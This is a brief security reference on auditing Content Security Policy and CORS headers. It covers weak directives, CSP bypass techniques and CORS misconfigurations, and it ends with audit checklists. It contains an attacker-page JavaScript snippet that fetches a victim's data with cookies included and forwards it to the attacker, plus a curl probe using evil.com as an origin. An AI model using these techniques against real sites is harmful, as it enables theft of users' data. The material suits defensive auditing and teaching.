# CSP and CORS Analysis

## Content Security Policy (CSP)

### Reading CSP
```bash
# Check CSP header
curl -I https://example.com | grep -i "content-security-policy"

# Or via browser
document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content
```

### CSP Directives
| Directive | Controls | Risk if Weak |
|-----------|----------|--------------|
| `script-src` | Script loading | XSS |
| `style-src` | Stylesheets | CSS injection |
| `img-src` | Images | Data exfiltration |
| `connect-src` | XHR/fetch | Data theft |
| `frame-src` | Iframes | Clickjacking |
| `default-src` | Fallback | General weakness |

### Dangerous Patterns
```
# Too permissive
script-src 'unsafe-inline' 'unsafe-eval';
script-src *;
script-src data:;

# JSONP endpoints
script-src https://trusted.com;
# But trusted.com has: /jsonp?callback=evil

# CDN bypasses
script-src https://cdnjs.cloudflare.com;
# Can load vulnerable libraries
```

### Bypass Techniques
1. **JSONP endpoints** on allowed domains
2. **Angular/Vue template injection** if framework loaded
3. **Base tag injection** to redirect relative URLs
4. **SVG with embedded script** via `img-src`

## CORS (Cross-Origin Resource Sharing)

### Reading CORS Headers
```bash
curl -I -H "Origin: https://evil.com" https://api.example.com/data
# Check: Access-Control-Allow-Origin
# Check: Access-Control-Allow-Credentials
```

### Dangerous Configurations
```
# Reflects any origin (with credentials!)
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true

# Wildcard with credentials (should be blocked)
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

# Null origin accepted
Access-Control-Allow-Origin: null
```

### CORS Exploitation
```javascript
// Attacker's page
fetch('https://vulnerable-api.com/user/data', {
  credentials: 'include'  // Send victim's cookies
})
.then(r => r.json())
.then(data => sendToAttacker(data));
```

## Security Checklist

### CSP Audit
1. Is `script-src` restrictive? (no `unsafe-inline`, `unsafe-eval`)
2. Are CDNs vetted for vulnerable libraries?
3. Is `default-src` set as fallback?
4. Is `frame-ancestors` set? (clickjacking)
5. Is `report-uri` configured for monitoring?

### CORS Audit
1. Does it reflect arbitrary origins?
2. Is `credentials: true` with loose origin?
3. Is `null` origin accepted?
4. Are preflight checks properly validated?
